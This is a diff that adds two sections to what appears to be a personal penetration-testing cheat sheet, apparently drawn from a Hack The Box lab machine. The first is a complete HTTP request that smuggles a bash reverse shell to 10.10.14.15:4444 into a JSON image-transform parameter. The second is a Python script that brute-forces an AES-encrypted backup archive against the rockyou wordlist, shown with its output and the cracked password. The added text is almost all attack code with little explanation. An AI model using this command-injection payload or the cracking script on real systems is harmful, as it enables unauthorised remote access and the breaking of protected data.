@@ -783,3 +783,62 @@ Try "help" to get a list of possible commands.
 smb: \> 
 ```
 {% endcode %}
+
+***
+
+## REVERSE SHELL WITH COMMANDE INJECTION
+
+{% code fullWidth="true" %}
+```
+POST /apply_visual_transform HTTP/1.1
+Host: imagery.htb:8000
+Content-Length: 150
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://imagery.htb:8000
+Referer: http://imagery.htb:8000/
+Accept-Encoding: gzip, deflate, br
+Cookie: session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aNvNug.hL2E0_8WbJfTGLFPxyyObLP6OyA
+Connection: keep-alive
+
+{"imageId":"f2f5f56e-c51d-4976-bce7-9cc8bad00e64","transformType":"crop","params":{"x":"&bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1;'","y":1,"width":840,"height":602}}
+```
+{% endcode %}
+
+***
+
+## PYTHON AES DECRYPT FILE
+
+```
+┌──(venv)─(kali㉿vbox)-[~]
+└─$ cat script.py 
+#!/usr/bin/env python3
+import pyAesCrypt
+
+encrypted = "Desktop/web_20250806_120723.zip.aes"
+decrypted = "backup.zip"
+password_file = "Desktop/rockyou.txt"
+
+with open(password_file, 'r', encoding='latin-1', errors='ignore') as file:
+    for line_num, password in enumerate(file, 1):
+        password = password.strip()
+        if not password:
+            continue
+        
+        try:
+            # Pas de bufferSize spécifié = utilise la valeur par défaut
+            pyAesCrypt.decryptFile(encrypted, decrypted, password)
+            print(f"✓ Mot de passe trouvé: {password}")
+            break
+        except:
+            if line_num % 1000 == 0:
+                print(f"Testé {line_num} mots de passe...")
+            continue    
+            
+            
+──(venv)─(kali㉿vbox)-[~]
+└─$ python3 script.py
+✓ Mot de passe trouvé: bestfriends
+```
